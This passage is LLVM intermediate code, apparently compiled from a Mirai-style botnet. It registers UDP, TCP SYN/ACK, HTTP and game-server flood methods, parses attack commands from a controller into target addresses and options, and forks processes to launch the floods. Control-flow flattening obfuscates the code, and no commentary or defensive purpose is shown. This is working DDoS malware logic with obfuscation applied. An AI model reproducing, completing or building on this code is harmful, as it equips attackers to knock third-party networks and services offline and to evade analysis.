([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [126 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_stdhex)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_ovhhex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -832123422, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -832123422, label %2
    i32 2065237730, label %6
    i32 1611733340, label %13
    i32 781628211, label %19
    i32 -190934760, label %23
    i32 -2010452372, label %26
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 3
  %5 = select i1 %4, i32 2065237730, i32 -2010452372
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp ne i32 %10, 0
  %12 = select i1 %11, i32 1611733340, i32 781628211
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @kill(i32 %17, i32 9) #6
  store i32 781628211, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %21
  store i32 0, i32* %22, align 4
  store i32 -190934760, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  store i32 -832123422, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %23, %19, %13, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 1568036416, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1568036416, label %first
    i32 -1859992976, label %17
    i32 -1325057221, label %18
    i32 410533965, label %32
    i32 556294406, label %33
    i32 1056476485, label %44
    i32 -1586917586, label %45
    i32 1764996440, label %57
    i32 -1035421713, label %58
    i32 -1680363695, label %66
    i32 -1934314750, label %67
    i32 -1061847916, label %72
    i32 1113321250, label %78
    i32 -655797115, label %120
    i32 -1912731632, label %123
    i32 1764686207, label %128
    i32 205201520, label %129
    i32 -540438061, label %141
    i32 1673800396, label %146
    i32 -1664989335, label %152
    i32 1694625745, label %157
    i32 1735784078, label %158
    i32 -1040538058, label %175
    i32 -1257892787, label %176
    i32 1105408727, label %189
    i32 -1452529346, label %190
    i32 -1387353904, label %219
    i32 114922819, label %222
    i32 2066000849, label %223
    i32 -552229090, label %231
    i32 1996151643, label %235
    i32 -1775773076, label %238
    i32 843840439, label %242
    i32 -451227426, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 -1859992976, i32 -1325057221
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 410533965, i32 556294406
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 1056476485, i32 -1586917586
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 1764996440, i32 -1035421713
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 -1680363695, i32 -1934314750
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 -1061847916, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 1113321250, i32 -1912731632
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 -655797115, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 -1061847916, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 1764686207, i32 205201520
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 -540438061, i32 2066000849
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 1673800396, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 -1664989335, i32 114922819
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 1694625745, i32 1735784078
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 -1040538058, i32 -1257892787
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 1105408727, i32 -1452529346
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 -1387353904, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 1673800396, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 2066000849, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 -552229090, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 1996151643, i32 -1775773076
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 -1775773076, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 843840439, i32 -451227426
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 -451227426, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 711677355, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 711677355, label %first
    i32 1098149347, label %20
    i32 -1005187086, label %24
    i32 1802484018, label %25
    i32 -1326224345, label %30
    i32 1382232999, label %31
    i32 -1070926983, label %35
    i32 -183432822, label %40
    i32 -291884436, label %41
    i32 1660648205, label %47
    i32 -1963306374, label %60
    i32 57751923, label %72
    i32 1557066778, label %73
    i32 -349118498, label %76
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, -1
